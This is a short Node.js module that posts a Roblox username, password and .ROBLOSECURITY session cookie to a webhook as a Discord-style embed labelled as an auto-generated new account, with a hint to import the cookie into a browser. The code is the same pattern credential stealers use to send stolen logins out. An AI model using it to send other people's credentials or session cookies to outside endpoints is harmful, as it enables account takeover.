const axios = require('axios');

async function sendToWebhook(webhookUrl, username, password, cookie) {
  const embed = {
    title: '✅ New Roblox Account',
    color: 0x57F287,
    fields: [
      { name: 'Username', value: `\`${username}\``, inline: true },
      { name: 'Password', value: `\`${password}\``, inline: true },
      { name: 'Cookie (.ROBLOSECURITY)', value: `\`${cookie}\``, inline: false },
      { name: 'Login Link', value: `https://www.roblox.com/login`, inline: false }
    ],
    footer: { text: 'Auto-generated | Use cookie to import into browser' },
    timestamp: new Date().toISOString()
  };

  try {
    await axios.post(webhookUrl, { embeds: [embed] }, { timeout: 5000 });
    console.log('[Webhook] Delivered');
  } catch (err) {
    console.error('[Webhook] Failed:', err.message);
  }
}

module.exports = { sendToWebhook };
